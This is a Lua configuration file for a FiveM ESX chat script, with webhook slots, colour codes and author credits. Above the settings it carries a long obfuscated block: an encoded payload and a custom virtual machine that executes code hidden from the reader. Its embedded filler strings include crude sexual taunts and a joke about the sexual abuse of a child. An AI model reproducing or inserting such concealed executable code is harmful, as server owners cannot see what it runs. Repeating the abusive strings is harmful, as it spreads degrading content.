Z32rn31Qn31qm1632sX1732Fc21232sr1l315v1h1u2iN161P1U32PB29331Oz1H1I131I1e31o22dB32FC32fe2db2rf2y832e1323o31vZ2932DB2Gf1h1E1V31Oz1p1H1821d1w31eJ31OZ1k1J21d21P31DR31Oz32eI32U61P32s532TF32P032S51q322v2aQ31Wi31w432s7321a31wN32qZ31Oo31oZ32Ex31NX31Wx31o0321O32TW1m31R4323t32FC21732gt1l1u2C829331Pk32s221D21l2Q61b2aT1e2W42m232vl32Ei32uE32mw32vQ2BA171m31PK32LT32eM31PE2Gf32GL2Xr1G314S21032t832VL1229t2n731oT32hS2yU32UW31K032rO32Ex31Nt31oT32i331sT32uW32eW31ot161l2aD27y2AX323g32i132WL31841i32E532F021024G25f31UE32F031Q71021K324l2y832Uv32x232rf32uZ31P3322U2Dw32ff1Q32V4329M31R331r531pE32V932vB32vd32W332Vh32vj31PK32Vm32vO32XX32Vr32uF32y01221D212310832VL32Ws31Nt31X832w232vF32w432w632w81732wA1132wc2Vw328H32ij10314O32h4182hW32j427632v132yN32Iu32yn32YP2FU2KK31nY32J332Ir31Nu28P32Yy29L32z031Ms"),(#E-(90));local function l(e,n,...)if(e==143603596)then return(o(o((o(n,784709))-966483,346648),82042));elseif(e==166300397)then return((((((n)-173986)-787843)-751552)-126532)-726030);elseif(e==693020657)then return(((o(n,387587))-53400)-349035);elseif(e==916597407)then return(((o(n,734567))-482526)-651509);elseif(e==558113100)then return(o((((n)-949727)-780849)-472790,923615));elseif(e==251583583)then return(o(o(o(o(o(n,859925),525613),916273),831612),61217));elseif(e==407863291)then return((((o(n,555139))-676031)-948321)-334508);elseif(e==601826710)then return((((((n)-665657)-23744)-435871)-280009)-9818);elseif(e==532906139)then return(o((((o(n,719391))-779817)-833607)-85764,40625));elseif(e==738876018)then return((((o(o(n,488903),694977))-527907)-465261)-207202);else end;end;local c=e["d3LG6t"];local i=e[((#{675;323;526;(function(...)return 852,303,446,101;end)()}+840867930))];local l=e[((#{733;}+645450598))];local t=e[(617546847)];local p=e[((587625931-#("oh Mr. Pools, thats a little close please dont touch me there... please Mr. Pools I am only eight years old please stop...")))];local b=e['oZS9MkyXV'];local y=e[(194855643)];local r=e['Uas2kf8J7'];local function d(l,e,n)if(n)then local e=(l/r^(e-t))%r^((n-t)-(e-t)+t);return(e-(e%t));else local e=r^(e-t);return(((l%(e+e)>=e)and(t))or(i));end;end;local function i()local e,t=w(h,a,a+r);e=o(e,n);n=e%l;t=o(t,n);n=t%l;a=a+r;return((t*l)+e);end;local function r()local i,r,t,e=w(h,a,a+c);i=o(i,n);n=i%l;r=o(r,n);n=r%l;t=o(t,n);n=t%l;e=o(e,n);n=e%l;a=a+y;return((e*p)+(t*b)+(r*l)+i);end;local function c()local e=o(w(h,a,a),n);n=e%l;a=(a+t);return(e);end;local E="\35";local function l(...)return({...}),k(E,...);end;local function q(...)local l=e[((617546952-#("PSU|161027525v21222B11273172751L275102731327523d27f22I27f21o26o24Y21J1827F1X27f1r27F23823a26w1... oh wait")))];local s=e[(413036661)];local E=e[(645450599)];local Q=e[((#{608;(function(...)return 627,932;end)()}+613564793))];local q=e[((448822124-#("The Voxel is sus")))];local D=e[((619771223-#("please suck my cock :pleading:")))];local _=e[((620108414-#("Luraph v12.6 has been released!: changed absolutely fucking nothing but donate to my patreon!")))];local L=e[(720081608)];local O=e[((#{(function(...)return 774,629;end)()}+269950367))];local J=e[(660649784)];local P=e[(776675209)];local g=e[((194855683-#("still waiting for luci to fix the API :|")))];local b=e[(127194832)];local y=e.Uas2kf8J7;local v=e[(734059897)];local A=e["d3LG6t"];local U=e["l8e8f3C"];local p=e[(909809103)];local m=e["L3F0wfb"];local t=e[((#{666;126;431;}+840867934))];local k=e["o70AZOu"];local I=e[(555034097)];local function F(...)local C=({});local e=({});local u=({});for i=t,r(n)-l,l do local u=c(n);if(u%s==k)then local n=c(n);e[i]=(n~=t);elseif(u%s==b)then while(true)do local a=r(n);local o=r(n);local r=l;local a=(d(o,l,q)*(y^m))+a;local n=d(o,s,J);local o=((-l)^d(o,m));if(n==t)then if(a==t)then e[i]=B(o*t);break;else n=l;r=t;end;elseif(n==v)then e[i]=(a==t)and(o*(l/t))or(o*(t/t));break;end;local n=Y(o,n-Q)*(r+(a/(y^O)));e[i]=n%l==t and B(n)or n break;end;elseif(u%s==p)then while(true)do local r=r(n);if(r==t)then e[i]=('');break;end;if(r>D)then local t,c=(''),(f(h,a,a+r-l));a=a+r;for e=l,#c,l do local e=o(w(f(c,e,e)),n);n=e%E;t=t..x[e];end;e[i]=t;else local l,t=(''),({w(h,a,a+r-l)});a=a+r;for t,e in S(t)do local e=o(e,n);n=e%E;l=l..x[e];end;e[i]=l;end;break;end;elseif(u%s==g)then while(true)do local n=r(n);e[i]=f(h,a,a+n-l);a=a+n;break;end;else e[i]=nil end;end;local o=r(n);for e=t,o-l,l do u[e]=({});end;for F=t,o-l,l do local o=c(n);if(o~=t)then o=o-l;local x,w,m,f,a,s=t,t,t,t,t,t;local h=d(o,l,A);if(h==l)then a=(r(n));s=(i(n));x=(c(n));elseif(h==b)then elseif(h==A)then a=u[(r(n))];s=(i(n));x=(c(n));f=(i(n));elseif(h==t)then a=(i(n));s=(i(n));x=(c(n));f=(i(n));elseif(h==y)then a=u[(r(n))];s=(i(n));x=(c(n));elseif(h==p)then a=(r(n));s=(i(n));x=(c(n));f=(i(n));w=({});for e=l,f,l do w[e]=({[t]=c(n),[l]=i(n)});end;end;if(d(o,g,g)==l)then s=e[s];end;if(d(o,L,L)==l)then m=u[r(n)];else m=u[F+l];end;if(d(o,b,b)==l)then f=e[f];end;if(d(o,p,p)==l)then a=e[a];end;if(d(o,I,I)==l)then w=({});for e=l,c(),l do w[e]=r();end;end;local e=u[F];e[-P]=a;e[-_]=x;e[-3078.037907909154]=f;e['CL2sLxa']=w;e[462566.755026013]=s;e[930820.8908071457]=m;end;end;local o=c(n);local a=i(n);for e=t,r(n)-l,l do C[e]=F();end;return({["Jz0n"]=o;["DdQN"]=t;[U]=e;['hWrE2wO']=u;['QbiWSq']=C;[-651076.023624158]=a;});end;return(F(...));end;local function w(e,n,c,...)local n=e['hWrE2wO'];local y=e['QbiWSq'];local i=e[-651076.023624158];local a=e["Jz0n"];local e=e[817674];local e=0;return(function(...)local h={...};local p=-9033;local d=n[e];local e=(true);local e=(689767208);local l=462566.755026013;local t=-658172;local f=-(1);local e=({});local o=930820.8908071457;local e="CL2sLxa";local x={};local r=-3078.037907909154;local b=(k(E,...)-1);local n={};local e=1;for e=0,b,e do if(e>=a)then x[e-a]=h[e+1];else n[e]=h[e+1];end;end;local h=b-a+1;repeat local e=d;local a=e[p];d=e[o];if(a<=20)then if(a<=9)then if(a<=4)then if(a<=1)then if(a>0)then local t=e[t];local o=n[t];for e=t+1,e[r]do o=o..n[e];end;n[e[l]]=o;elseif(a<1)then local e=e[l];n[e]=n[e](n[e+1]);for e=e+1,i do n[e]=nil;end;end;elseif(a<=2)then local e=e[l];n[e](n[1+e]);for e=e,i do n[e]=nil;end;elseif(a==3)then local l=e[l];local o=e[t];local t=50*(e[r]-1);local a=n[l];local e=0;for o=l+1,o do a[t+e+1]=n[l+(o-l)];e=e+1;end;elseif(a<=4)then n[e[l]]=e[t];end;elseif(a<=6)then if(a==5)then n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];e=e[o];elseif(a<=6)then n[e[l]]=n[e[t]];e=e[o];n[e[l]]=e[t];e=e[o];local a=e[l];n[a](s(n,a+1,e[t]));for e=a+1,i do n[e]=nil;end;e=e[o];n[e[l]]=c[e[t]];e=e[o];n[e[l]]=e[t];e=e[o];local a=e[l];n[a](n[1+a]);for e=a,i do n[e]=nil;end;e=e[o];n[e[l]]=c[e[t]];e=e[o];n[e[l]]=e[t];e=e[o];e=e[o];end;elseif(a<=7)then n[e[l]][e[t]]=e[r];elseif(a==8)then n[e[l]]=w(y[e[t]],(nil),c);elseif(a<=9)then n[e[l]]=n[e[t]];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=c[e[t]];e=e[o];n[e[l]]=c[e[t]];e=e[o];n[e[l]]=n[e[t]][e[r]];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=#n[e[t]];e=e[o];local a=e[l];n[a]=n[a](s(n,a+1,e[t]));for e=a+1,i do n[e]=nil;end;e=e[o];n[e[l]]=n[e[t]][n[e[r]]];e=e[o];local a=e[l];n[a]=n[a](n[a+1]);for e=a+1,i do n[e]=nil;end;e=e[o];n[e[l]]=e[t];e=e[o];local c=e[t];local a=n[c];for e=c+1,e[r]do a=a..n[e];end;n[e[l]]=a;e=e[o];local l=e[l];n[l](s(n,l+1,e[t]));for e=l+1,i do n[e]=nil;end;e=e[o];e=e[o];end;elseif(a<=14)then if(a<=11)then if(a==10)then if(n[e[l]])then d=e[t];end;elseif(a<=11)then n[e[l]]=u(e[t]);end;elseif(a<=12)then elseif(a>13)then n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];e=e[o];elseif(a<14)then n[e[l]]=u(e[t]);e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];e=e[o];end;elseif(a<=17)then if(a<=15)then if(not(n[e[l]]))then d=e[t];end;elseif(a>16)then n[e[l]]=u(256);elseif(a<17)then do return;end;end;elseif(a<=18)then n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];e=e[o];elseif(a>19)then n[e[l]]=#n[e[t]];elseif(a<20)then n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];e=e[o];end;elseif(a<=31)then if(a<=25)then if(a<=22)then if(a==21)then n[e[l]]=n[e[t]][e[r]];elseif(a<=22)then n[e[l]]=({(nil)});end;elseif(a<=23)then local l=e[l];n[l]=n[l](s(n,l+1,e[t]));for e=l+1,i do n[e]=nil;end;elseif(a==24)then n[e[l]]=c[e[t]];e=e[o];n[e[l]]=n[e[t]][e[r]];e=e[o];n[e[l]]=u(256);e=e[o];n[e[l]][e[t]]=e[r];e=e[o];n[e[l]][e[t]]=e[r];e=e[o];n[e[l]][e[t]]=e[r];e=e[o];n[e[l]][e[t]]=n[e[r]];e=e[o];local a=e[l];n[a]=n[a](n[a+1]);for e=a+1,i do n[e]=nil;end;e=e[o];n[e[l]]=u(256);e=e[o];n[e[l]][e[t]]=e[r];e=e[o];local a=e[l];n[a](s(n,a+1,e[t]));for e=a+1,i do n[e]=nil;end;e=e[o];n[e[l]]=c[e[t]];e=e[o];n[e[l]]=n[e[t]];e=e[o];local a=e[l];n[a](n[1+a]);for e=a,i do n[e]=nil;end;e=e[o];n[e[l]]=c[e[t]];e=e[o];n[e[l]]=n[e[t]][e[r]];e=e[o];n[e[l]]=e[t];e=e[o];local a=e[l];n[a](n[1+a]);for e=a,i do n[e]=nil;end;e=e[o];n[e[l]]=c[e[t]];e=e[o];e=e[o];elseif(a<=25)then n[e[l]][e[t]]=n[e[r]];end;elseif(a<=28)then if(a<=26)then local l=e[l];n[l](s(n,l+1,e[t]));for e=l+1,i do n[e]=nil;end;elseif(a==27)then e=e[o];e=e[o];elseif(a<=28)then n[e[l]]=c[e[t]];e=e[o];n[e[l]]=n[e[t]][e[r]];e=e[o];n[e[l]]=u(256);e=e[o];n[e[l]][e[t]]=e[r];e=e[o];n[e[l]][e[t]]=e[r];e=e[o];n[e[l]][e[t]]=e[r];e=e[o];n[e[l]][e[t]]=e[r];e=e[o];local a=e[l];n[a]=n[a](n[a+1]);for e=a+1,i do n[e]=nil;end;e=e[o];n[e[l]]=u(256);e=e[o];n[e[l]][e[t]]=e[r];e=e[o];local l=e[l];n[l](s(n,l+1,e[t]));for e=l+1,i do n[e]=nil;end;e=e[o];e=e[o];end;elseif(a<=29)then local l=e[l];n[l]=0+(n[l]);n[l+1]=0+(n[l+1]);n[l+2]=0+(n[l+2]);local o=n[l];local a=n[l+2];if(a>0)then if(o>n[l+1])then d=e[t];else n[l+3]=o;end;elseif(o<n[l+1])then d=e[t];else n[l+3]=o;end;elseif(a==30)then e=e[o];e=e[o];elseif(a<=31)then n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];local a=(_185);(function()n[e[l]]=e[t];e=e[o];end){};n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];local a=(_61);(function()n[e[l]]=e[t];e=e[o];end){};n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];local a=(_107);(function()n[e[l]]=e[t];e=e[o];end){};n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];local a=(_131);(function()n[e[l]]=e[t];e=e[o];end){};n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];e=e[o];end;elseif(a<=36)then if(a<=33)then if(a==32)then local a=(_160);(function()n[e[l]]=e[t];e=e[o];end){};n[e[l]]=e[t];e=e[o];local a=(_36);(function()n[e[l]]=e[t];e=e[o];end){};local a=(_26);(function()n[e[l]]=e[t];e=e[o];end){};n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];local a=(_15);(function()n[e[l]]=e[t];e=e[o];end){};n[e[l]]=e[t];e=e[o];local a=(_42);(function()n[e[l]]=e[t];e=e[o];end){};n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];e=e[o];elseif(a<=33)then n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];n[e[l]]=e[t];e=e[o];e=e[o];end;elseif(a<=34)then e=e[o];local t=e[l];f=t+h-1;for e=0,h do n[t+e]=x[e];end;for e=f+1,i do n[e]=nil;end;e=e[o];local l=e[l];do return s(n,l,f);end;e=e[o];e=e[o];elseif(a>35)then n[e[l]]=c[e[t]];elseif(a<36)then n[e[l]]=n[e[t]][n[e[r]]];end;elseif(a<=39)then if(a<=37)then local e=e[l];do return s(n,e,f);end;elseif(a>38)then n[e[l]]=n[e[t]];elseif(a<39)then local l=e[l];f=l+h-1;for e=0,h do n[l+e]=x[e];end;for e=f+1,i do n[e]=nil;end;end;elseif(a<=40)then n[e[l]]=c[e[t]];e=e[o];n[e[l]]=n[e[t]][e[r]];e=e[o];n[e[l]]=e[t];e=e[o];local a=e[l];n[a]=n[a](n[a+1]);for e=a+1,i do n[e]=nil;end;e=e[o];n[e[l]][e[t]]=n[e[r]];e=e[o];n[e[l]][e[t]]=e[r];e=e[o];n[e[l]][e[t]]=e[r];e=e[o];n[e[l]][e[t]]=n[e[r]];e=e[o];n[e[l]][e[t]]=n[e[r]];e=e[o];e=e[o];elseif(a>41)then if(n[e[l]]==e[r])then d=e[t];end;elseif(a<42)then local l=e[l];local a=n[l+2];local o=n[l]+a;n[l]=o;if(a>0)then if(o<=n[l+1])then d=e[t];n[l+3]=o;end;elseif(o>=n[l+1])then d=e[t];n[l+3]=o;end;end;until false end);end;return w(q(),{},v())(...);end)(({[(947031618)]=(((6226-#("you dumped constants by printing the deserializer??? ladies and gentlemen stand clear we have a genius in the building."))));[((840867962-#("When the exploiter is sus")))]=(((#{666;}-1)));[((#{461;(function(...)return...;end)(652,304,227,460)}+677114821))]=((855259411));[((710505118-#("guys someone play Among Us with memcorrupt he is so lonely :(")))]=((2640));[((#{843;191;(function(...)return 454,384,101,350;end)()}+817695741))]=((490802007));[((#{763;(function(...)return 86,856,157,...;end)(637)}+965470822))]=((248));["q5iYhJd"]=(((1020-#("IIiIIiillIiiIIIiiii :troll:"))));VFb6pSGY=((36));[((#{115;746;155;925;}+269950365))]=(((#{342;}+51)));[(357294186)]=("\97");[((802411931-#("Luraph: Probably considered the worst out of the three, Luraph is another Lua Obfuscator. It isnt remotely as secure as Ironbrew or Synapse Xen, and it isn't as fast as Ironbrew either.")))]=((255));[(858336734)]=((123952054));buM6QmhUU=("\50");[((#{622;}+634546496))]=((955070482));[(810855663)]=("\101");[(962393851)]=(((1501-#("@everyone designs are done. luraph website coming.... eta JULY 2020"))));[(655715890)]=((165));['Uas2kf8J7']=(((#{(function(...)return 774,928,...;end)(539,927)}-2)));['NQ6LDtmbz7']=((226));[((822020733-#("When the exploiter is sus")))]=(((197740824-#("why does psu.dev attract so many ddosing retards wtf"))));[(156013574)]=("\110");[((140251880-#("please suck my cock :pleading:")))]=("\104");[(662615371)]=("\51");[((919604252-#("why does psu.dev attract so many ddosing retards wtf")))]=(((#{(function(...)return 323,676;end)()}+868679044)));[(448822108)]=(((81-#("guys someone play Among Us with memcorrupt he is so lonely :("))));[((#{685;721;175;}+483063656))]=("\120");[((458767291-#("Perth Was here impossible ikr")))]=("\105");[((127194875-#("https://www.youtube.com/watch?v=Lrj2Hq7xqQ8")))]=((6));I0L7FJsY=(((156013601-#("IIiIIiillIiiIIIiiii :troll:"))));[((168511825-#("LuraphDeobfuscator.zip (oh god DMCA incoming everyone hide)")))]=((662615371));["L3F0wfb"]=((32));[(555034097)]=(((192-#("Luraph: Probably considered the worst out of the three, Luraph is another Lua Obfuscator. It isnt remotely as secure as Ironbrew or Synapse Xen, and it isn't as fast as Ironbrew either."))));[(776675209)]=((658172));[((194855710-#("i am not wally stop asking me for wally hub support please fuck off")))]=(((#{(function(...)return 211;end)()}+3)));[((#{445;275;382;166;}+682946435))]=("\121");[((720081660-#("I hate this codebase so fucking bad! - notnoobmaster")))]=((8));[(522632269)]=((810855663));[(754633677)]=((531));[((341528371-#("psu 34567890fps, luraph 1fps, xen 0fps")))]=((2884));[((909809182-#("Are you using AztupBrew, clvbrew, or IB2? Congratulations! You're deobfuscated!")))]=(((#{710;810;553;(function(...)return;end)()}+2)));[(857472028)]=((458767262));[((495244396-#("Luraph v12.6 has been released!: changed absolutely fucking nothing but donate to my patreon!")))]=("\107");[((#{}+780251604))]=(((483063726-#("@everyone designs are done. luraph website coming.... eta JULY 2020"))));[((#{(function(...)return 474,293,160;end)()}+799276673))]=((108));[(375484556)]=((38129));[(828067077)]=(((#{465;828;}+1060)));["sglctwSYt"]=("\115");["l8e8f3C"]=(((817717-#("https://www.youtube.com/watch?v=Lrj2Hq7xqQ8"))));[(692955052)]=(((#{571;176;119;254;}+495244299)));['uYwNyju']=((1996));[((#{831;461;635;(function(...)return 627;end)()}+301965151))]=("\119");[((734059940-#("https://www.youtube.com/watch?v=Lrj2Hq7xqQ8")))]=(((2114-#("@everyone designs are done. luraph website coming.... eta JULY 2020"))));o70AZOu=((9));[(303624972)]=((357294186));[((660649813-#("Perth Was here impossible ikr")))]=((31));[(464184213)]=((90));["d3LG6t"]=((3));[((#{859;403;616;}+447124824))]=("\109");[((613564856-#("woooow u hooked an opcode, congratulations~ now suck my cock")))]=((1023));[((197740854-#("who the fuck looked at synapse xen and said 'yeah this is good enough for release'")))]=("\99");['fbsiTFECLj']=("\112");[((413036728-#("@everyone designs are done. luraph website coming.... eta JULY 2020")))]=((21));[(613121840)]=((998));[((855259451-#("still waiting for luci to fix the API :|")))]=("\114");[((#{943;507;(function(...)return 984,120,897;end)()}+820089080))]=(((1042-#("psu == femboy hangout"))));[((#{449;233;}+158431257))]=((514));[(620108321)]=(((9218-#("Luraph: Probably considered the worst out of the three, Luraph is another Lua Obfuscator. It isnt remotely as secure as Ironbrew or Synapse Xen, and it isn't as fast as Ironbrew either."))));[((713812197-#("who the fuck looked at synapse xen and said 'yeah this is good enough for release'")))]=((682946439));[(444848209)]=((301965155));[((#{824;(function(...)return 285,984,815;end)()}+490802003))]=("\98");[((#{742;52;}+285806583))]=(((#{736;777;(function(...)return 757,65;end)()}+713)));[(448628030)]=((149868495));[(123952054)]=("\108");[(239715719)]=((447124827));[(619771193)]=((5000));[(868679046)]=("\117");[(149868495)]=("\100");[(427069559)]=("\116");[(645450599)]=((256));vux7NSCon=(((#{55;299;294;}+2594)));[(955070482)]=("\111");[(629609709)]=(((385-#("why does psu.dev attract so many ddosing retards wtf"))));[(337780492)]=(((#{917;415;(function(...)return 174,844,224,273;end)()}+427069553)));["oZS9MkyXV"]=((65536));[(617546847)]=(((#{346;333;698;}-2)));[(596947923)]=((140251850));[(826959616)]=((26));[((587625849-#("still waiting for luci to fix the API :|")))]=(((16777258-#("this isn't krnl support you bonehead moron"))));}),...)})do return e end;
  
  

  -- custom logs NS --
NSWebhooks = {
      ["default"] = "", -- JUST PUT THE SAME WEBHOOK FOR ALL! CHAT IS ALL 
      ["chat"] = "",
      ["OOC"] = "",
      ["Tweet"] = "",
      ["NS_Chat_Logs"] = ""
  
  }
  
 NSColors = {
      ["default"] = 16711680,
      ["blue"] = 25087,
      ["green"] = 762640,
      ["white"] = 16777215,
      ["black"] = 0,
      ["orange"] = 16743168,
      ["lightgreen"] = 65309,
      ["yellow"] = 15335168,
      ["turqois"] = 62207,
      ["pink"] = 16711900,
      ["red"] = 16711680,
      ["grey"] = 2103330,
  }

-- 💻 Chat script made by NS100  Please dont remove creds :)
-- 💻 [Description]: Esx addon chat script to the original fivem chat! - This is not standalone.
-- 💻 [Description 2]: This chat comes with working logs, also made by me.
-- 💻 [Website]: https://NS100.xyz
-- 💻 [Github]: https://github.com/NSFivem/NSFivem/tree/main
-- 💻 [ND Development]: https://discord.gg/yFU4yvacXt
-- 💻 {Disclaimer}: If you use my script please keep my credits! or else you like to copy work! :)

-- ~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~= --
--             Optimized & Made By: NS100                 --
-- ~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~= --
